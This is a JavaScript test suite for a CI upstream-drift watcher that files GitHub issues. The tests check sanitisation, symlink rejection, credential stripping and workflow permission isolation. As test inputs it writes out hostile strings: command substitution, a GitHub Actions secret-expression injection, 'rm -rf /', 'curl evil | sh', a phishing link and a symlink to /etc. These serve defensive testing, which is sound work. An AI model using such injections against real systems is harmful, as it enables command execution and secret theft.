import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import yaml from "js-yaml";

import {
  INSTALL_LABEL,
  LABEL,
  LIMITS,
  RESULT_SCHEMA,
  capBody,
  childEnv,
  collectMcp,
  collectOkf,
  conformanceKey,
  countSymlinks,
  createGitHub,
  fence,
  fileIssue,
  isInfrastructureFailure,
  isNewerStable,
  issueBody,
  main,
  marker,
  parseArgs,
  parsePins,
  renderMcp,
  renderOkf,
  report,
  sanitizeInline,
  validateResult,
  verificationSteps,
} from "./upstream-watch.mjs";
import { parseActionDocument, validateIdentities } from "./workflow-actions.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const realPins = parsePins(readFileSync(path.join(root, "scripts", "upstream-watch.json"), "utf8"));
const LS = String.fromCharCode(0x2028); // LINE SEPARATOR, a newline to some Markdown renderers
const PIN = "a".repeat(40);
const NEXT = "b".repeat(40);
const HEAD = "c".repeat(40);
const pins = {
  schema: "superbee.upstream-watch.v1",
  okf: { repo: "example/okf", path: "SPEC.md", commit: PIN },
  mcp: { "@modelcontextprotocol/sdk": "1.32.1", "@modelcontextprotocol/ext-apps": "1.7.5" },
};
const HOSTILE = "evil`name`$(touch /tmp/pwned)${{ secrets.GITHUB_TOKEN }}\n@everyone" + LS + "```";
const PHISH = "x| @octocat [phish](https://evil.example) |y";
const clean = { code: 0, stdout: JSON.stringify({ docs: 9, malformed: 0 }), stderr: "" };

function githubFake(routes) {
  const calls = [];
  const get = async (route) => {
    calls.push(route);
    if (!Object.hasOwn(routes, route)) throw new Error(`GitHub HTTP 404 for GET ${route}`);
    return routes[route];
  };
  return { get, calls };
}

function treeFake(bundleNames, setup = () => {}) {
  const dir = mkdtempSync(path.join(tmpdir(), "upstream-watch-test-"));
  const rootDir = path.join(dir, "okf-main");
  mkdirSync(rootDir, { recursive: true });
  for (const name of bundleNames) mkdirSync(path.join(rootDir, "bundles", name), { recursive: true });
  setup(rootDir);
  let cleaned = false;
  return {
    fetchTree: async () => ({ root: rootDir, cleanup: () => { cleaned = true; rmSync(dir, { recursive: true, force: true }); } }),
    get cleaned() { return cleaned; },
  };
}

const okfRoutes = (latestSpec, files = []) => ({
  "/repos/example/okf/commits?path=SPEC.md&per_page=1": [{ sha: latestSpec }],
  "/repos/example/okf/commits?per_page=1": [{ sha: HEAD }],
  [`/repos/example/okf/compare/${PIN}...${latestSpec}`]: { files: files.map((filename) => ({ filename })) },
});

// Collect, then cross the job boundary exactly as the workflow does: JSON, validate, render.
async function okfRun({ latestSpec = PIN, files = [], bundles = [], setup, runStatus = async () => clean }) {
  const raw = await collectOkf({ pins, github: githubFake(okfRoutes(latestSpec, files)).get, fetchTree: treeFake(bundles, setup).fetchTree, runStatus });
  return renderOkf(validateResult(JSON.parse(JSON.stringify(raw)), pins, "okf"), pins);
}

function throwingClient() {
  const fail = () => { throw new Error("issue client must not be called"); };
  return { ensureLabel: fail, hasMarker: fail, createIssue: fail };
}

test("the committed pin file is valid and names the dependencies the workspace actually uses", () => {
  assert.equal(realPins.okf.repo, "GoogleCloudPlatform/open-knowledge-format");
  const manifest = JSON.parse(readFileSync(path.join(root, "packages", "mcp-app", "package.json"), "utf8"));
  for (const name of Object.keys(realPins.mcp)) assert.ok(manifest.dependencies?.[name], `${name} is not an mcp-app dependency`);
  for (const broken of [
    { ...pins, schema: "other" },
    { ...pins, okf: { ...pins.okf, commit: "main" } },
    { ...pins, okf: { ...pins.okf, repo: "a/b/c" } },
    { ...pins, mcp: { "@modelcontextprotocol/sdk": "^1.0.0" } },
    { ...pins, mcp: {} },
  ]) assert.throws(() => parsePins(JSON.stringify(broken)));
});

test("an unchanged SPEC pin with conforming bundles produces no issue", async () => {
  const github = githubFake(okfRoutes(PIN));
  const tree = treeFake(["acme_retail", "ga4"]);
  const seen = [];
  const raw = await collectOkf({ pins, github: github.get, fetchTree: tree.fetchTree, runStatus: async (dir) => { seen.push(path.basename(dir)); return clean; } });
  const rendered = renderOkf(validateResult(raw, pins, "okf"), pins);
  assert.equal(rendered.kind, "ok");
  assert.equal(rendered.title, null);
  assert.deepEqual(seen, ["acme_retail", "ga4"]);
  assert.ok(tree.cleaned, "the downloaded tree is always removed");
  assert.ok(!github.calls.some((route) => route.includes("/compare/")), "no compare call when the pin is current");
  assert.deepEqual(await fileIssue(rendered, "", { client: throwingClient(), dryRun: false, log: () => {} }), { action: "none" });
});

test("a changed SPEC commit produces the deterministic title, key, compare link and file list", async () => {
  const rendered = await okfRun({ latestSpec: NEXT, files: ["SPEC.md", "bundles/ga4/index.md"], bundles: ["ga4"] });
  assert.equal(rendered.title, "Upstream drift: OKF SPEC.md at bbbbbbb");
  assert.equal(rendered.key, `okf-spec:${NEXT}`);
  const body = issueBody(rendered, { runUrl: "https://github.com/o/r/actions/runs/1" });
  assert.ok(body.startsWith(`<!-- upstream-watch:okf-spec:${NEXT} -->\n`));
  assert.match(body, new RegExp(`https://github.com/example/okf/compare/${PIN}\\.\\.\\.${NEXT}`));
  assert.match(body, /Changed files \(2\): `SPEC\.md`, `bundles\/ga4\/index\.md`/);
  assert.match(body, /bump the reviewed pin in `scripts\/upstream-watch\.json`/);
  assert.match(body, /Run: https:\/\/github.com\/o\/r\/actions\/runs\/1/);
});

test("conformance failures are reported per bundle with a key stable across upstream commits", async () => {
  const outcomes = {
    exits: { code: 2, stdout: "", stderr: "boom" },
    malformed: { code: 0, stdout: JSON.stringify({ docs: 3, malformed: 2 }), stderr: "" },
    timestamps: { code: 0, stdout: JSON.stringify({ docs: 3, malformed: 0, invalid_timestamps: 4, invalid_timestamp_fields: { total: 4 } }), stderr: "" },
    rowsonly: { code: 0, stdout: JSON.stringify({ docs: 3, malformed: 0, invalid_timestamp_fields: { total: 1 } }), stderr: "" },
    empty: { code: 0, stdout: JSON.stringify({ docs: 0, malformed: 0 }), stderr: "" },
    garbage: { code: 0, stdout: "not json", stderr: "" },
    ok: clean,
  };
  const runStatus = async (dir) => outcomes[path.basename(dir)];
  const rendered = await okfRun({ bundles: Object.keys(outcomes), runStatus });
  assert.equal(rendered.kind, "drift");
  assert.match(rendered.title, /^Upstream drift: OKF sample bundle conformance \([0-9a-f]{10}\)$/);
  assert.match(rendered.key, new RegExp(`^okf-conformance:${PIN}:[0-9a-f]{10}$`));
  for (const expected of [
    /`exits` \| 2 \| - \| - \| - \| FAIL: exit 2; status output is not a JSON object/,
    /`malformed` \| 0 \| 3 \| 2 \| 0 \| FAIL: 2 malformed/,
    /`timestamps` \| 0 \| 3 \| 0 \| 4 \| FAIL: 4 invalid timestamps/,
    /`rowsonly` \| 0 \| 3 \| 0 \| 1 \| FAIL: 1 invalid timestamps/,
    /`empty` \| 0 \| 0 \| 0 \| 0 \| FAIL: no documents read/,
    /`garbage` \| 0 .* FAIL: status output is not a JSON object/,
    /`ok` \| 0 \| 9 \| 0 \| 0 \| ok/,
  ]) assert.match(rendered.summary, expected);
  assert.match(rendered.summary, /stderr from `exits`:\n\n```text\nboom\n```/);

  // A new upstream commit with the same failures keeps the key; a different failure set does not.
  const routes = { ...okfRoutes(PIN), "/repos/example/okf/commits?per_page=1": [{ sha: "d".repeat(40) }] };
  const later = renderOkf(validateResult(await collectOkf({ pins, github: githubFake(routes).get, fetchTree: treeFake(Object.keys(outcomes)).fetchTree, runStatus }), pins, "okf"), pins);
  assert.equal(later.key, rendered.key);
  assert.equal(conformanceKey(PIN, [{ name: "b", reasons: ["x"] }, { name: "a", reasons: ["y"] }]), conformanceKey(PIN, [{ name: "a", reasons: ["y"] }, { name: "b", reasons: ["x"] }]));
  assert.notEqual(conformanceKey(PIN, [{ name: "a", reasons: ["y"] }]), conformanceKey(PIN, [{ name: "a", reasons: ["z"] }]));
  assert.notEqual(conformanceKey(PIN, [{ name: "a", reasons: ["y"] }]), conformanceKey(NEXT, [{ name: "a", reasons: ["y"] }]));

  const none = await okfRun({ bundles: [] });
  assert.equal(none.kind, "drift", "an upstream tree without sample bundles is a failure, not a pass");
  assert.match(none.summary, /No sample bundles were found/);
});

test("symlinks anywhere in a bundle fail that bundle without being read, and dangling links do not crash", async () => {
  const read = [];
  const rendered = await okfRun({
    bundles: ["linked", "dangling", "fine"],
    setup: (rootDir) => {
      writeFileSync(path.join(rootDir, "secret.txt"), "host data");
      mkdirSync(path.join(rootDir, "bundles", "linked", "deep"));
      symlinkSync(path.join(rootDir, "secret.txt"), path.join(rootDir, "bundles", "linked", "deep", "doc.md"));
      symlinkSync(path.join(rootDir, "does-not-exist"), path.join(rootDir, "bundles", "dangling", "index.md"));
      symlinkSync("/etc", path.join(rootDir, "bundles", "whole-bundle"));
    },
    runStatus: async (dir) => { read.push(path.basename(dir)); return clean; },
  });
  assert.deepEqual(read, ["fine"], "only the symlink-free bundle reaches the CLI");
  assert.equal(rendered.kind, "drift");
  for (const name of ["linked", "dangling", "whole-bundle"]) {
    assert.match(rendered.summary, new RegExp(`\`${name}\` \\| - \\| - \\| - \\| - \\| FAIL: contains 1 symbolic link`));
  }
  const dir = mkdtempSync(path.join(tmpdir(), "upstream-watch-loop-"));
  try {
    symlinkSync(dir, path.join(dir, "loop"));
    symlinkSync(path.join(dir, "missing"), path.join(dir, "dangling"));
    assert.equal(countSymlinks(dir), 2);
  } finally { rmSync(dir, { recursive: true, force: true }); }

  const linkedRoot = await okfRun({ setup: (rootDir) => symlinkSync("/etc", path.join(rootDir, "bundles")) });
  assert.match(linkedRoot.summary, /`bundles\/` is a symbolic link/);
});

test("table cells cannot be broken out of, and mentions and links are neutralized", async () => {
  assert.equal(sanitizeInline("a|b"), "a\\|b");
  assert.ok(!sanitizeInline("@octocat").includes("@o"), "a zero-width joiner separates @ from the handle");
  assert.doesNotMatch(sanitizeInline("[x](https://e) ![i](https://e/i.png) <img src=x>"), /[[\]<>]/);

  // The reviewer's probe: a bundle directory named to split the row and plant a live mention and link.
  const rendered = await okfRun({ latestSpec: NEXT, files: [PHISH], bundles: [PHISH] });
  const row = rendered.summary.split("\n").find((line) => line.startsWith("| `x"));
  const cells = row.split(/(?<!\\)\|/).slice(1, -1);
  assert.equal(cells.length, 6, `row must keep exactly six cells: ${row}`);
  for (const text of [row, rendered.summary]) {
    assert.doesNotMatch(text, /@octocat/);
    assert.doesNotMatch(text, /\]\(https:/);
  }
});

test("MCP drift counts only strictly newer stable releases", () => {
  assert.equal(isNewerStable("1.33.0", "1.32.1"), true);
  assert.equal(isNewerStable("2.0.0", "1.99.99"), true);
  assert.equal(isNewerStable("1.32.1", "1.32.1"), false);
  assert.equal(isNewerStable("1.32.0", "1.32.1"), false);
  assert.equal(isNewerStable("1.33.0-beta.1", "1.32.1"), false);
  assert.equal(isNewerStable("1.10.0", "1.9.0"), true, "numeric, not lexical, comparison");
  for (const junk of ["", "latest", "v1.33.0", "1.33", "1.33.0 ; rm -rf /", undefined]) assert.equal(isNewerStable(junk, "1.32.1"), false);

  const render = (sdk, ext) => renderMcp(validateResult({ schema: RESULT_SCHEMA, target: "mcp", status: "ok", verification: null,
    packages: [{ name: "@modelcontextprotocol/sdk", latest: sdk }, { name: "@modelcontextprotocol/ext-apps", latest: ext }] }, pins, "mcp"), pins);
  assert.equal(render("1.32.1", "1.8.0-rc.1").title, null);
  const both = render("1.33.0", "2.0.3");
  assert.equal(both.title, "Upstream drift: @modelcontextprotocol/sdk 1.33.0, @modelcontextprotocol/ext-apps 2.0.3");
  assert.equal(both.key, "mcp:@modelcontextprotocol/sdk@1.33.0,@modelcontextprotocol/ext-apps@2.0.3");
  assert.equal(render("1.33.0", "1.7.5").title, "Upstream drift: @modelcontextprotocol/sdk 1.33.0");
  const hostile = render(HOSTILE.slice(0, 60), "1.7.5");
  assert.equal(hostile.title, null);
  assert.match(hostile.summary, /unreadable version/);
  assert.doesNotMatch(hostile.summary, /\n@everyone/);
});

test("MCP verification runs argv arrays in order, stops at the first failure, and is skipped without --verify", async () => {
  const latest = { "@modelcontextprotocol/sdk": "1.33.0\n", "@modelcontextprotocol/ext-apps": "1.7.5" };
  const npmView = async (name) => latest[name];
  const skipped = await collectMcp({ pins, npmView, runNpm: async () => assert.fail("must not run npm without --verify"), verify: false });
  assert.equal(skipped.verification, null);
  assert.match(renderMcp(validateResult(skipped, pins, "mcp"), pins).summary, /Verification against the newer versions was skipped/);

  const calls = [];
  const runNpm = async (argv) => {
    calls.push(argv);
    return argv[1] === "typecheck" ? { code: 2, stdout: "x".repeat(10000), stderr: "TS2345 ```" } : { code: 0, stdout: "", stderr: "" };
  };
  const raw = await collectMcp({ pins, npmView, runNpm, verify: true });
  assert.deepEqual(calls, verificationSteps([{ name: "@modelcontextprotocol/sdk", version: "1.33.0" }]).slice(0, 3).map((step) => step.argv));
  assert.deepEqual(calls[0], ["install", "--no-audit", "--no-fund", "--ignore-scripts", "-w", "@superbee/mcp-app", "@modelcontextprotocol/sdk@1.33.0"]);
  const rendered = renderMcp(validateResult(JSON.parse(JSON.stringify(raw)), pins, "mcp"), pins);
  assert.equal(rendered.kind, "drift");
  assert.match(rendered.summary, /\| `npm run typecheck` \| 2 \|/);
  assert.match(rendered.summary, /````text\n[\s\S]*TS2345 ```\n````/, "the fence outgrows backtick runs in tool output");
  assert.ok(rendered.summary.length < LIMITS.log + 2000, "tool output is capped");

  const passing = await collectMcp({ pins, npmView, runNpm: async () => ({ code: 0, stdout: "", stderr: "" }), verify: true });
  assert.match(renderMcp(validateResult(passing, pins, "mcp"), pins).summary, /All verification steps passed/);
});

test("watcher failures are classified apart from drift and deduplicated against open issues only", async () => {
  const npmDown = await collectMcp({ pins, npmView: async () => { throw new Error("npm view @modelcontextprotocol/sdk exited 1"); }, runNpm: async () => assert.fail(), verify: true });
  assert.equal(npmDown.status, "error");
  const down = renderMcp(validateResult(npmDown, pins, "mcp"), pins);
  assert.deepEqual([down.kind, down.title, down.key, down.openOnly], ["error", "Upstream watch failing: mcp", "failing:mcp", true]);
  assert.match(issueBody(down), /watcher could not complete/);

  const latest = { "@modelcontextprotocol/sdk": "1.33.0", "@modelcontextprotocol/ext-apps": "1.7.5" };
  const registry = await collectMcp({ pins, npmView: async (n) => latest[n], runNpm: async () => ({ code: 1, stdout: "", stderr: "npm error code ETIMEDOUT\nnpm error network request to https://registry.npmjs.org failed" }), verify: true });
  assert.equal(renderMcp(validateResult(registry, pins, "mcp"), pins).kind, "error");
  assert.equal(isInfrastructureFailure({ label: INSTALL_LABEL, code: 1, output: "npm error code E503" }), true);
  assert.equal(isInfrastructureFailure({ label: "npm run build", code: 2, output: "ETIMEDOUT in a test" }), false, "only the install step can be a registry failure");
  assert.equal(isInfrastructureFailure({ label: INSTALL_LABEL, code: 1, output: "ERESOLVE could not resolve peer" }), false, "an unresolvable dependency graph is drift");

  const apiDown = await collectOkf({ pins, github: async () => { throw new Error("GitHub HTTP 503 for GET /repos/example/okf/commits"); }, fetchTree: async () => assert.fail(), runStatus: async () => assert.fail() });
  assert.equal(renderOkf(validateResult(apiDown, pins, "okf"), pins).title, "Upstream watch failing: okf");

  const asked = [];
  const client = { ensureLabel: async () => {}, hasMarker: async (key, options) => { asked.push([key, options]); return true; }, createIssue: async () => assert.fail() };
  assert.deepEqual(await fileIssue(down, issueBody(down), { client, dryRun: false, log: () => {} }), { action: "duplicate" });
  assert.deepEqual(asked, [["failing:mcp", { openOnly: true }]]);
});

test("the report job rejects anything but a strictly shaped result and reports that as a watcher failure", async () => {
  const good = { schema: RESULT_SCHEMA, target: "mcp", status: "ok", verification: null, packages: [{ name: "@modelcontextprotocol/sdk", latest: "1.32.1" }, { name: "@modelcontextprotocol/ext-apps", latest: "1.7.5" }] };
  assert.equal(validateResult(good, pins, "mcp").status, "ok");
  for (const [label, bad] of [
    ["extra key", { ...good, extra: 1 }],
    ["wrong target", { ...good, target: "okf" }],
    ["schema", { ...good, schema: "x" }],
    ["reordered packages", { ...good, packages: [...good.packages].reverse() }],
    ["long version", { ...good, packages: [{ name: "@modelcontextprotocol/sdk", latest: "1".repeat(500) }, good.packages[1]] }],
    ["unknown step", { ...good, verification: [{ label: "curl evil | sh", code: 0, output: "" }] }],
    ["float exit", { ...good, verification: [{ label: INSTALL_LABEL, code: 0.5, output: "" }] }],
    ["string exit", { ...good, verification: [{ label: INSTALL_LABEL, code: "0", output: "" }] }],
    ["huge output", { ...good, verification: [{ label: INSTALL_LABEL, code: 1, output: "x".repeat(LIMITS.log + 100) }] }],
  ]) assert.throws(() => validateResult(bad, pins, "mcp"), /result rejected/, label);
  const okfGood = { schema: RESULT_SCHEMA, target: "okf", status: "ok", latestSpec: PIN, head: HEAD, files: [], bundlesLinked: false,
    bundles: [{ name: "a", symlinks: 0, code: 0, parsed: true, docs: 1, malformed: 0, invalidTimestamps: 0, stderr: "" }] };
  assert.equal(validateResult(okfGood, pins, "okf").status, "ok");
  for (const patch of [{ head: "HEAD" }, { latestSpec: PIN.toUpperCase() }, { bundles: [{ ...okfGood.bundles[0], code: 256 }] }, { bundles: [{ ...okfGood.bundles[0], docs: -1 }] }, { bundles: [{ ...okfGood.bundles[0], reasons: [] }] }]) {
    assert.throws(() => validateResult({ ...okfGood, ...patch }, pins, "okf"), /result rejected/, JSON.stringify(patch));
  }

  const printed = [];
  const { rendered } = await report("mcp", { ...good, extra: "<script>" }, pins, {}, { client: throwingClient(), log: (t) => printed.push(t) }, { dryRun: true });
  assert.equal(rendered.kind, "error");
  assert.match(printed.join(""), /result rejected: result has unknown key extra/);
});

test("issues are deduplicated by body marker across open and closed issues regardless of label", async () => {
  const requests = [];
  const key = `okf-spec:${NEXT}`;
  let searchItems = [];
  let labelled = [];
  let labelExists = false;
  const fetchImpl = async (url, init) => {
    requests.push({ url, method: init.method, body: init.body ? JSON.parse(init.body) : undefined, auth: init.headers.Authorization });
    const respond = (status, value) => new Response(value === undefined ? null : JSON.stringify(value), { status });
    if (url.endsWith(`/labels/${LABEL}`)) return labelExists ? respond(200, { name: LABEL }) : respond(404, { message: "Not Found" });
    if (url.endsWith("/labels")) { labelExists = true; return respond(201, { name: LABEL }); }
    if (url.includes("/search/issues?")) return respond(200, { items: searchItems });
    if (url.includes("/issues?")) return respond(200, labelled);
    if (url.endsWith("/issues")) return respond(201, { html_url: "https://github.com/o/r/issues/9" });
    return respond(500, {});
  };
  const client = createGitHub({ token: "t", repo: "o/r", fetchImpl });
  const rendered = { kind: "drift", title: "Upstream drift: OKF SPEC.md at bbbbbbb", key, summary: "s" };
  const body = issueBody(rendered);
  const log = () => {};

  // A closed issue whose label a human removed and whose title was edited still suppresses a repeat.
  searchItems = [{ state: "closed", title: "renamed by a human", body: `${marker(key)}\nold`, labels: [] }];
  assert.deepEqual(await fileIssue(rendered, body, { client, dryRun: false, log }), { action: "duplicate" });
  const search = new URL(requests.find((r) => r.url.includes("/search/issues")).url);
  assert.equal(search.searchParams.get("q"), `repo:o/r is:issue in:body "upstream-watch:${key}"`);
  assert.ok(requests.some((r) => r.method === "POST" && r.url.endsWith("/labels")), "a missing label is created");

  // Search lag: the labelled listing still finds an open issue with the marker.
  searchItems = [];
  labelled = [{ state: "open", title: "x", body: marker(key) }];
  assert.deepEqual(await fileIssue(rendered, body, { client, dryRun: false, log }), { action: "duplicate" });

  // Same title without the marker, a different key, or a pull request does not suppress.
  searchItems = [{ state: "open", title: rendered.title, body: "no marker" }, { state: "open", title: "pr", body: marker(key), pull_request: {} }];
  labelled = [{ state: "open", title: "x", body: marker(`${key}0`) }];
  const created = await fileIssue(rendered, body, { client, dryRun: false, log });
  assert.deepEqual(created, { action: "created", url: "https://github.com/o/r/issues/9" });
  const post = requests.at(-1);
  assert.equal(post.url, "https://api.github.com/repos/o/r/issues");
  assert.deepEqual(post.body, { title: rendered.title, body, labels: [LABEL] });
  assert.equal(post.auth, "Bearer t");

  // Watcher failures only consider open issues.
  requests.length = 0;
  searchItems = [{ state: "closed", title: "old", body: marker("failing:okf") }];
  labelled = [];
  assert.equal(await client.hasMarker("failing:okf", { openOnly: true }), false);
  assert.match(new URL(requests.find((r) => r.url.includes("/search/")).url).searchParams.get("q"), / is:open$/);
  assert.ok(requests.some((r) => r.url.includes("/issues?state=open&")));
  await assert.rejects(createGitHub({ repo: "o/r", fetchImpl }).createIssue({}), /GITHUB_TOKEN/);
});

test("dry run prints the would-be issue and never calls the issue client", async () => {
  const printed = [];
  const rendered = { kind: "drift", title: "Upstream drift: x", key: "k", summary: "s" };
  const outcome = await fileIssue(rendered, "body text", { client: throwingClient(), dryRun: true, log: (text) => printed.push(text) });
  assert.deepEqual(outcome, { action: "dry-run" });
  assert.match(printed.join(""), /Title: Upstream drift: x\n\nbody text/);
});

test("untrusted upstream text is neutralized, fenced safely, and capped", async () => {
  const inline = sanitizeInline(HOSTILE);
  assert.ok(!inline.includes("`") && !inline.includes("\n") && !inline.includes(LS));
  assert.ok(inline.includes("$(touch /tmp/pwned)") && inline.includes("${{ secrets.GITHUB_TOKEN }}"), "text is data, passed through literally");
  assert.ok(sanitizeInline("x".repeat(5000)).length < LIMITS.inline + 60);
  assert.match(fence("a ````` b"), /^``````text\n/);

  const files = Array.from({ length: 400 }, (_, i) => `${HOSTILE}${"y".repeat(1000)}${i}`);
  const rendered = await okfRun({
    latestSpec: NEXT, files, bundles: [HOSTILE.replace(new RegExp(`[\n${LS}/]`, "g"), "_")],
    runStatus: async () => ({ code: 1, stdout: "", stderr: `${HOSTILE}${"z".repeat(100000)}` }),
  });
  const body = issueBody(rendered);
  assert.ok(body.length <= LIMITS.body);
  assert.match(body, /Changed files \(400\): .* and 350 more/);
  // Raw upstream stderr only appears inside a fence that its own backtick runs cannot close.
  assert.match(body, /````text\nevil`name`/);
  const outsideFences = body.replace(/(`{3,})text\n[\s\S]*?\n\1(?!`)/g, "");
  assert.ok(!/\n@everyone/.test(outsideFences), "no upstream text starts a line of its own outside a fence");
  assert.ok(!body.includes("z".repeat(LIMITS.log + 1)), "stderr is capped");
  assert.equal(capBody("q".repeat(LIMITS.body + 10)).length, LIMITS.body);
  assert.match(capBody("q".repeat(LIMITS.body + 10)), /Report truncated/);
});

test("child processes never inherit credentials or workflow command files", () => {
  const env = childEnv({ PATH: "/bin", GITHUB_TOKEN: "x", GH_TOKEN: "x", NPM_TOKEN: "x", ACTIONS_RUNTIME_TOKEN: "x", MY_SECRET: "x", GITHUB_STEP_SUMMARY: "/s", GITHUB_OUTPUT: "/o", GITHUB_ENV: "/e", HOME: "/h" });
  assert.deepEqual(env, { PATH: "/bin", HOME: "/h" });
});

test("arguments are strict", () => {
  assert.deepEqual(parseArgs(["okf", "--dry-run"]), { command: "okf", target: "okf", dryRun: true, verify: false, collect: null, input: null });
  assert.deepEqual(parseArgs(["mcp", "--verify", "--collect", "r.json"]), { command: "mcp", target: "mcp", dryRun: false, verify: true, collect: "r.json", input: null });
  assert.deepEqual(parseArgs(["report", "okf", "--input", "r.json", "--dry-run"]), { command: "report", target: "okf", dryRun: true, verify: false, collect: null, input: "r.json" });
  for (const bad of [[], ["both"], ["okf", "--verify"], ["mcp", "--force"], ["report", "okf"], ["report", "both", "--input", "x"], ["okf", "--collect", "x", "--dry-run"], ["report", "mcp", "--input", "x", "--verify"]]) {
    assert.throws(() => parseArgs(bad), undefined, bad.join(" "));
  }
});

test("collect writes only the result file; report writes the summary and treats a missing result as a watcher failure", async (t) => {
  const dir = mkdtempSync(path.join(tmpdir(), "upstream-watch-main-"));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const resultFile = path.join(dir, "out", "result.json");
  const summaryFile = path.join(dir, "summary.md");
  const latest = Object.fromEntries(Object.keys(realPins.mcp).map((name) => [name, realPins.mcp[name]]));
  await main(["mcp", "--collect", resultFile], { GITHUB_STEP_SUMMARY: summaryFile }, {
    npmView: async (name) => latest[name],
    log: () => assert.fail("collect prints no report"),
  });
  assert.throws(() => readFileSync(summaryFile), /ENOENT/, "the collect phase never writes the job summary");
  assert.equal(JSON.parse(readFileSync(resultFile, "utf8")).status, "ok");

  const result = await main(["report", "mcp", "--input", resultFile], { GITHUB_STEP_SUMMARY: summaryFile }, { client: throwingClient(), log: () => assert.fail() });
  assert.equal(result.outcome.action, "none");
  assert.match(readFileSync(summaryFile, "utf8"), /## MCP upstream watch[\s\S]*No drift: no issue needed\./);

  const printed = [];
  const missing = await main(["report", "okf", "--input", path.join(dir, "absent.json"), "--dry-run"], {}, { client: throwingClient(), log: (text) => printed.push(text) });
  assert.equal(missing.rendered.title, "Upstream watch failing: okf");
  assert.match(printed.join(""), /the check job wrote no result/);
});

test("the workflow isolates upstream code from write permissions and the issue writer from upstream content", () => {
  const text = readFileSync(path.join(root, ".github", "workflows", "upstream-watch.yml"), "utf8");
  const identities = validateIdentities(JSON.parse(readFileSync(path.join(root, "scripts", "ci-lanes.json"), "utf8")).github_actions.identities);
  const { document } = parseActionDocument(text, "upstream-watch.yml", { identities });
  const on = document.on ?? document[true];
  assert.deepEqual(on.schedule.map((row) => row.cron), ["41 6 * * 1", "29 6 * * *"]);
  assert.equal(on.workflow_dispatch.inputs.dry_run.default, true);
  assert.deepEqual(on.workflow_dispatch.inputs.target.options, ["both", "okf", "mcp"]);
  assert.deepEqual(document.permissions, { contents: "read" });
  assert.deepEqual(Object.keys(document.jobs).sort(), ["mcp-check", "mcp-report", "okf-check", "okf-report"]);
  assert.match(document.jobs["okf-check"].if, /github\.event\.schedule == '41 6 \* \* 1'/);
  assert.match(document.jobs["mcp-check"].if, /github\.event\.schedule == '29 6 \* \* \*'/);

  const runs = (job) => job.steps.filter((step) => typeof step.run === "string").map((step) => step.run).join("\n");
  const untrusted = /\bnpm (?:ci|install|run|test|exec)\b|\bnpx\b|upstream-watch\.mjs (?:okf|mcp)\b/;
  for (const [name, job] of Object.entries(document.jobs)) {
    const writes = Object.entries(job.permissions ?? {}).filter(([, level]) => level === "write");
    const checkout = job.steps.find((step) => step.uses?.startsWith("actions/checkout@"));
    assert.equal(checkout.with["persist-credentials"], false, `${name} must not persist credentials`);
    assert.ok(!Object.hasOwn(checkout.with, "repository") && !Object.hasOwn(checkout.with, "ref"), `${name} checks out this repository at the triggering commit only`);
    for (const step of job.steps) {
      if (step.uses?.startsWith("actions/setup-node@")) assert.ok(!Object.hasOwn(step.with, "cache"), `${name} must not use or save the npm cache`);
      if (typeof step.run === "string") assert.doesNotMatch(step.run, /\$\{\{/, "run scripts take inputs through env, never templated");
      if (typeof step.run === "string") assert.doesNotMatch(step.run, /\b(git push|git commit|gh pr|npm publish)\b/);
    }
    if (untrusted.test(runs(job))) {
      assert.deepEqual(writes, [], `${name} runs upstream code or reads upstream content and must hold no write permission`);
      assert.ok(name.endsWith("-check"), name);
      assert.ok(job.steps.some((step) => step.uses?.startsWith("actions/upload-artifact@")), `${name} hands off through an artifact`);
    }
    if (writes.length > 0) {
      assert.deepEqual(job.permissions, { contents: "read", issues: "write" }, name);
      assert.doesNotMatch(runs(job), untrusted, `${name} must not install, build, test, or collect upstream content`);
      assert.match(runs(job), /^(?:.*\n)?\s*(?:if .*|else|fi|node scripts\/upstream-watch\.mjs report (?:okf|mcp) --input "\$RUNNER_TEMP\/upstream-watch\/result\.json"(?: --dry-run)?)$/m);
      for (const line of runs(job).split("\n").map((l) => l.trim()).filter(Boolean)) {
        assert.match(line, /^(?:if \[ "\$DRY_RUN" = "true" \]; then|else|fi|node scripts\/upstream-watch\.mjs report (?:okf|mcp) --input "\$RUNNER_TEMP\/upstream-watch\/result\.json"(?: --dry-run)?)$/, `${name} runs only the report command: ${line}`);
      }
      assert.ok(job.steps.some((step) => step.uses?.startsWith("actions/download-artifact@")), `${name} reads the check result`);
      assert.equal(job.if, `\${{ always() && needs.${name.replace("-report", "-check")}.result != 'skipped' }}`);
    }
  }
  assert.match(runs(document.jobs["mcp-check"]), /upstream-watch\.mjs mcp --verify --collect/);
  assert.match(runs(document.jobs["okf-check"]), /npm run build[\s\S]*upstream-watch\.mjs okf --collect/);
  assert.ok(yaml.safeLoad(text));
});
